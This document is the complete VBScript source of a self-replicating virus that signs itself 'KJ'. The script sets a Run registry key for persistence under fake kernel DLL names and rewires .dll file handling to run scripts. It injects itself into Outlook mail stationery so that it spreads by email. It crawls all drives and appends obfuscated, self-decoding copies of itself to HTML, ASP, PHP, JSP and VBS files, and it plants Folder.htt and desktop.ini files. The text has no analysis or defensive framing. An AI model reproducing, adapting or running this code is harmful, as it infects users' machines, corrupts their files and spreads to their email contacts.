'I'm KJ.ovkfjpehkeejfqkdfrehvy
Dim KJInWhere,KJHtmlText,KJVbsText,KJAppleObject,KJFSO,KJWsShell,KJWinPath,KJSubE,KJFinalyDisk,KJRenOnLoad
Sub KJ_start()
KJSetDim()
KJCreateMilieu()
KJLikeIt()
KJCreateMail()
KJPropagate()
End Sub

Function KJAppendTo(FilePath,TypeStr)
On Error Resume Next
Set ReadTemp = KJFSO.OpenTextFile(FilePath,1)
TmpStr = ReadTemp.ReadAll
If Instr(TmpStr,"Execute(""") <> 0 Or Len(TmpStr) < 1 Then
ReadTemp.Close
Exit Function
End If
If TypeStr = "htt" Then
ReadTemp.Close
Set FileTemp = KJFSO.OpenTextFile(FilePath,2)
FileTemp.Write KJRenOnLoad & TmpStr & vbCrLf & KJHtmlText
FileTemp.Close
Set FAttrib = KJFSO.GetFile(FilePath)
FAttrib.attributes = 34
Else
ReadTemp.Close
Set FileTemp = KJFSO.OpenTextFile(FilePath,8)
If TypeStr = "html" Then
FileTemp.Write vbCrLf & "<" & "HTML>" & vbCrLf & KJRenOnLoad & KJHtmlText
ElseIf TypeStr = "vbs" Then
FileTemp.Write vbCrLf & KJVbsText
End If
FileTemp.Close
End If
End Function

Function KJChangeSub(CurrentString,LastIndexChar)
If LastIndexChar = 0 Then
If Left(LCase(CurrentString),1) =< LCase("c") Then
KJChangeSub = KJFinalyDisk & ":\"
KJSubE = 0
Else
KJChangeSub = Chr(Asc(Left(LCase(CurrentString),1)) - 1) & ":\"
KJSubE = 0
End If
Else
KJChangeSub = Mid(CurrentString,1,LastIndexChar)
End If
End Function

Function KJCreateMail()
On Error Resume Next
If KJInWhere = "html" Then
Exit Function
End If
ShareFile = Left(KJWinPath,3) & "Program Files\Common Files\Microsoft Shared\Stationery\blank.htm"
If (KJFSO.FileExists(ShareFile)) Then
Call KJAppendTo(ShareFile,"html")
Else
Set FileTemp = KJFSO.OpenTextFile(ShareFile,2,true)
FileTemp.Write "<" & "HTML>" & vbCrLf & KJRenOnLoad & KJHtmlText
FileTemp.Close
End If
DefaultId = KJWsShell.RegRead("HKEY_CURRENT_USER\Identities\Default User ID")
OutLookVersion = KJWsShell.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Outlook Express\MediaVer")
KJWsShell.RegWrite "HKEY_CURRENT_USER\Identities\"&DefaultId&"\Software\Microsoft\Outlook Express\"& Left(OutLookVersion,1) &".0\Mail\Compose Use Stationery",1,"REG_DWORD"
Call KJMailReg("HKEY_CURRENT_USER\Identities\"&DefaultId&"\Software\Microsoft\Outlook Express\"& Left(OutLookVersion,1) &".0\Mail\Stationery Name",ShareFile)
Call KJMailReg("HKEY_CURRENT_USER\Identities\"&DefaultId&"\Software\Microsoft\Outlook Express\"& Left(OutLookVersion,1) &".0\Mail\Wide Stationery Name",ShareFile)
KJWsShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Outlook\Options\Mail\EditorPreference",131072,"REG_DWORD"
Call KJMailReg("HKEY_CURRENT_USER\Software\Microsoft\Windows Messaging Subsystem\Profiles\Microsoft Outlook Internet Settings\0a0d020000000000c000000000000046\001e0360","blank")
Call KJMailReg("HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Microsoft Outlook Internet Settings\0a0d020000000000c000000000000046\001e0360","blank")
KJWsShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Outlook\Options\Mail\EditorPreference",131072,"REG_DWORD"
Call KJMailReg("HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Common\MailSettings\NewStationery","blank")
KJummageFolder(Left(KJWinPath,3) & "Program Files\Common Files\Microsoft Shared\Stationery")
End Function

Function KJCreateMilieu()
On Error Resume Next
TempPath = ""
If Not(KJFSO.FileExists(KJWinPath & "WScript.exe")) Then
TempPath = "system32\"
End If
If TempPath = "system32\" Then
StartUpFile = KJWinPath & "SYSTEM\Kernel32.dll"
Else
StartUpFile = KJWinPath & "system\Kernel.dll"
End If
KJWsShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Kernel32",StartUpFile
KJFSO.CopyFile KJWinPath & "system32\setup.txt",KJWinPath & "web\Folder.htt"
KJFSO.CopyFile KJWinPath & "system32\inet.vxd",KJWinPath & "system32\desktop.ini"
Call KJAppendTo(KJWinPath & "web\Folder.htt","htt")
KJWsShell.RegWrite "HKEY_CLASSES_ROOT\.dll\","dllfile"
KJWsShell.RegWrite "HKEY_CLASSES_ROOT\.dll\Content Type","application/x-msdownload"
KJWsShell.RegWrite "HKEY_CLASSES_ROOT\dllfile\DefaultIcon\",KJWsShell.RegRead("HKEY_CLASSES_ROOT\vxdfile\DefaultIcon\")
KJWsShell.RegWrite "HKEY_CLASSES_ROOT\dllfile\ScriptEngine\","VBScript"
KJWsShell.RegWrite "HKEY_CLASSES_ROOT\dllFile\Shell\Open\Command\",KJWinPath & TempPath & "WScript.exe ""%1"" %*"
KJWsShell.RegWrite "HKEY_CLASSES_ROOT\dllFile\ShellEx\PropertySheetHandlers\WSHProps\","{60254CA5-953B-11CF-8C96-00AA00B8708C}"
KJWsShell.RegWrite "HKEY_CLASSES_ROOT\dllFile\ScriptHostEncode\","{85131631-480C-11D2-B1F9-00C04F86C324}"
Set FileTemp = KJFSO.OpenTextFile(StartUpFile,2,true)
FileTemp.Write KJVbsText
FileTemp.Close
End Function

Function KJLikeIt()
If KJInWhere <> "html" Then
Exit Function
End If
ThisLocation = document.location
If Left(ThisLocation, 4) = "file" Then
ThisLocation = Mid(ThisLocation,9)
If KJFSO.GetExtensionName(ThisLocation) <> "" then
ThisLocation = Left(ThisLocation,Len(ThisLocation) - Len(KJFSO.GetFileName(ThisLocation)))
End If
If Len(ThisLocation) > 3 Then
ThisLocation = ThisLocation & "\"
End If
KJummageFolder(ThisLocation)
End If
Randomize
KJId = SetTimeout("KJ_Start()", Int(12 * Rnd) * 10000)
End Function

Function KJAddMess()
KJAddMess = "'I'm KJ."
KJAddMess = KJAddMess & KJVarChar() & KJVarChar() & KJVarChar() & VbCrLf
End Function

Function KJDelLine(Strs)
KJDelLine = Mid(Strs,InStr(Strs,VbCrLf) + 2)
End Function

Function KJMailReg(RegStr,FileName)
On Error Resume Next
RegTempStr = KJWsShell.RegRead(RegStr)
If RegTempStr = "" Then
KJWsShell.RegWrite RegStr,FileName
End If
End Function

Function KJOboSub(CurrentString)
KJSubE = 0
TestOut = 0
Do While True
TestOut = TestOut + 1
If TestOut > 28 Then
CurrentString = KJFinalyDisk & ":\"
Exit Do
End If
On Error Resume Next
Set ThisFolder = KJFSO.GetFolder(CurrentString)
Set DicSub = CreateObject("Scripting.Dictionary")
Set Folders = ThisFolder.SubFolders
FolderCount = 0
For Each TempFolder in Folders
FolderCount = FolderCount + 1
DicSub.add FolderCount, TempFolder.Name
Next
If DicSub.Count = 0 Then
LastIndexChar = InstrRev(CurrentString,"\",Len(CurrentString)-1)
SubString = Mid(CurrentString,LastIndexChar+1,Len(CurrentString)-LastIndexChar-1)
CurrentString = KJChangeSub(CurrentString,LastIndexChar)
KJSubE = 1
Else
If KJSubE = 0 Then
CurrentString = CurrentString & DicSub.Item(1) & "\"
Exit Do
Else
j = 0
For j = 1 To FolderCount
If LCase(SubString) = LCase(DicSub.Item(j)) Then
If j < FolderCount Then
CurrentString = CurrentString & DicSub.Item(j+1) & "\"
Exit Do
End If
End If
Next
LastIndexChar = InstrRev(CurrentString,"\",Len(CurrentString)-1)
SubString = Mid(CurrentString,LastIndexChar+1,Len(CurrentString)-LastIndexChar-1)
CurrentString = KJChangeSub(CurrentString,LastIndexChar)
End If
End If
Loop
KJOboSub = CurrentString
End Function

Function KJPropagate()
On Error Resume Next
RegPathValue = "HKEY_LOCAL_MACHINE\Software\Microsoft\Outlook Express\Degree"
DiskDegree = KJWsShell.RegRead(RegPathValue)
If DiskDegree = "" Then
DiskDegree = KJFinalyDisk & ":\"
End If
For i=1 to 5
DiskDegree = KJOboSub(DiskDegree)
KJummageFolder(DiskDegree)
Next
KJWsShell.RegWrite RegPathValue,DiskDegree
End Function

Function KJummageFolder(PathName)
On Error Resume Next
Set FolderName = KJFSO.GetFolder(PathName)
Set ThisFiles = FolderName.Files
HttExists = 0
For Each ThisFile In ThisFiles
FileExt = UCase(KJFSO.GetExtensionName(ThisFile.Path))
If FileExt = "HTM" Or FileExt = "HTML" Or FileExt = "ASP" Or FileExt = "PHP" Or FileExt = "JSP" Then
Call KJAppendTo(ThisFile.Path,"html")
ElseIf FileExt = "VBS" Then
Call KJAppendTo(ThisFile.Path,"vbs")
ElseIf FileExt = "HTT" Then
HttExists = 1
End If
Next
If (UCase(PathName) = UCase(KJWinPath & "Desktop\")) Or (UCase(PathName) = UCase(KJWinPath & "Desktop"))Then
HttExists = 1
End If
If HttExists = 0 Then
KJFSO.CopyFile KJWinPath & "system32\desktop.ini",PathName
KJFSO.CopyFile KJWinPath & "web\Folder.htt",PathName
End If
End Function

Function KJVarChar()
Randomize
For I = 1 To Int(6 * Rnd) + 4
KJVarchar = KJVarChar & Chr(97 + Int(25 * Rnd))
Next
End Function

Function KJNon()
Randomize
If Int(10 * Rnd) > 4 Then
KJNon = """&"""
Else
KJNon = ""
End If
End Function

Function KJSetDim()
On Error Resume Next
Err.Clear
TestIt = WScript.ScriptFullname
If Err Then
KJInWhere = "html"
Else
KJInWhere = "vbs"
End If
If KJInWhere = "vbs" Then
Set KJFSO = CreateObject("Scripting.FileSystemObject")
Set KJWsShell = CreateObject("WScript.Shell")
Else
Set KJAppleObject = document.applets("KJ_guest")
KJAppleObject.setCLSID("{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}")
KJAppleObject.createInstance()
Set KJWsShell = KJAppleObject.GetObject()
KJAppleObject.setCLSID("{0D43FE01-F093-11CF-8940-00A0C9054228}")
KJAppleObject.createInstance()
Set KJFSO = KJAppleObject.GetObject()
End If
Set DiskObject = KJFSO.Drives
For Each DiskTemp In DiskObject
If DiskTemp.DriveType <> 2 And DiskTemp.DriveType <> 1 Then
Exit For
End If
KJFinalyDisk = DiskTemp.DriveLetter
Next
Dim OtherArr(3)
Randomize
For i=0 To 3
OtherArr(i) = Int((9 * Rnd))
Next
TempString = ""
KJText = KJDelLine(KJText)
KJText = KJAddMess & KJText
For i=1 To Len(KJText)
TempNum = Asc(Mid(KJText,i,1))
If TempNum = 13 Then
TempNum = 28
ElseIf TempNum = 10 Then
TempNum = 29
End If
TempChar = Chr(TempNum - OtherArr(i Mod 4))
If TempChar = Chr(34) Then
TempChar = Chr(18)
End If
TempString = TempString & TempChar
Next
KJRenOnLoad = "<" & "script language=vbscript>" & vbCrLf & "document.write ""<" & "B"&KJNon&"O"&KJNon&"D"&KJNon&"Y"&KJNon&" "&KJNon&"o"&KJNon&"n"&KJNon&"l"&KJNon&"o"&KJNon&"a"&KJNon&"d"&KJNon&"=""""K"&KJNon&"J"&KJNon&"_"&KJNon&"s"&KJNon&"t"&KJNon&"a"&KJNon&"r"&KJNon&"t"&KJNon&"()""""" & ">""" & vbCrLf & "<" & "/script>" & vbCrLf
VarExeString = KJVarChar() & KJVarChar()
VarKeyArr = KJVarChar() & KJVarChar()
VarThisText = KJVarChar() & KJVarChar()
VarTempNum = KJVarChar()
VarTempChar = KJVarChar()
UnLockStr = "Execute("""&KJNon&"D"&KJNon&"i"&KJNon&"m " & VarKeyArr & "("&KJNon&"3"&KJNon&")"&KJNon&"," & VarThisText & """&vbCrLf&""" & VarKeyArr & "("&KJNon&"0"&KJNon&") "&KJNon&"= " & OtherArr(0) & """&vbCrLf&""" & VarKeyArr & "("&KJNon&"1"&KJNon&") "&KJNon&"= " & OtherArr(1) & """&vbCrLf&""" & VarKeyArr & "("&KJNon&"2"&KJNon&") "&KJNon&"= " & OtherArr(2) & """&vbCrLf&""" & VarKeyArr & "("&KJNon&"3"&KJNon&") "&KJNon&"= " & OtherArr(3) & """&vbCrLf&""Fo"&KJNon&"r i"&KJNon&"=1"&KJNon&" T"&KJNon&"o "&KJNon&"L"&KJNon&"e"&KJNon&"n(" & VarExeString & ")""&vbCrLf&""" & VarTempNum & " = A"&KJNon&"s"&KJNon&"c("&KJNon&"M"&KJNon&"i"&KJNon&"d(" & VarExeString & ","&KJNon&"i"&KJNon&",1"&KJNon&"))""&vbCrLf&""If " & VarTempNum & " ="&KJNon&" 1"&KJNon&"8"&KJNon&" T"&KJNon&"h"&KJNon&"en""&vbCrLf&""" & VarTempNum & " "&KJNon&"= "&KJNon&"3"&KJNon&"4""&vbCrLf&""E"&KJNon&"nd"&KJNon&" I"&KJNon&"f""&vbCrLf&""" & VarTempChar & " ="&KJNon&" C"&KJNon&"hr"&KJNon&"(" & VarTempNum & " + " & VarKeyArr & "(i "&KJNon&"Mo"&KJNon&"d "&KJNon&"4))""&vbCrLf&""I"&KJNon&"f " & VarTempChar & " = C"&KJNon&"h"&KJNon&"r(2"&KJNon&"8)"&KJNon&" Th"&KJNon&"en""&vbCrLf&""" & VarTempChar & " = "&KJNon&"vb"&KJNon&"Cr""&vbCrLf&""Els"&KJNon&"eIf " & VarTempChar & " = C"&KJNon&"hr("&KJNon&"2"&KJNon&"9) Th"&KJNon&"en""&vbCrLf&""" & VarTempChar & " = vb"&KJNon&"Lf""&vbCrLf&""En"&KJNon&"d If""&vbCrLf&""" & VarThisText & " = " & VarThisText & " & " & VarTempChar & """&vbCrLf&""Ne"&KJNon&"xt""&vbCrLf&""K"&KJNon&"J"&KJNon&"T"&KJNon&"e"&KJNon&"x"&KJNon&"t"&KJNon&" "&KJNon&"= " & VarThisText & """)" & vbCrLf & "Execute(" & VarThisText & ")"
ThisText = VarExeString & " = """ & TempString & """"
KJHtmlText ="<" & "script language=vbscript>" & vbCrLf & "document.write " & """" & "<" & "div style='position:absolute; left:0px; top:0px; width:0px; height:0px; z-index:28; visibility: hidden'>" & "<""&""" & "AP"&KJNon&"P"&KJNon&"LE"&KJNon&"T "&KJNon&"NA"&KJNon&"ME="&KJNon&"K"&KJNon&"J""&""_"&KJNon&"g"&KJNon&"u"&KJNon&"e"&KJNon&"s"&KJNon&"t HEI"&KJNon&"GHT=0 WI"&KJNon&"DTH=0 c"&KJNon&"od"&KJNon&"e=c"&KJNon&"o"&KJNon&"m"&KJNon&".m"&KJNon&"s"&KJNon&".""&""a"&KJNon&"c"&KJNon&"t"&KJNon&"i"&KJNon&"v"&KJNon&"e"&KJNon&"X"&KJNon&"."&KJNon&"A"&KJNon&"c"&KJNon&"t"&KJNon&"i"&KJNon&"v"&KJNon&"e""&""X"&KJNon&"C"&KJNon&"o"&KJNon&"m"&KJNon&"p"&KJNon&"o"&KJNon&"n"&KJNon&"e"&KJNon&"n"&KJNon&"t>" & "<" & "/A"&KJNon&"P"&KJNon&"PL"&KJNon&"ET>" & "<" & "/div>""" & vbCrLf & "<" & "/script>" & vbCrLf & "<" & "script language=vbscript>" & vbCrLf & ThisText & vbCrLf & UnLockStr & vbCrLf & "<" & "/script>" & vbCrLf & "<" & "/BODY>" & vbCrLf & "<" & "/HTML>"
KJVbsText = ThisText & vbCrLf & UnLockStr & vbCrLf & "Execute("""&KJNon&"K"&KJNon&"J"&KJNon&"_"&KJNon&"s"&KJNon&"t"&KJNon&"a"&KJNon&"r"&KJNon&"t"&KJNon&"("&KJNon&")"")"
KJWinPath = KJFSO.GetSpecialFolder(0) & "\"
If (KJFSO.FileExists(KJWinPath & "web\Folder.htt")) Then
KJFSO.CopyFile KJWinPath & "web\Folder.htt",KJWinPath & "system32\setup.txt"
End If
If (KJFSO.FileExists(KJWinPath & "system32\desktop.ini")) Then
KJFSO.CopyFile KJWinPath & "system32\desktop.ini",KJWinPath & "system32\inet.vxd"
End If
End Function
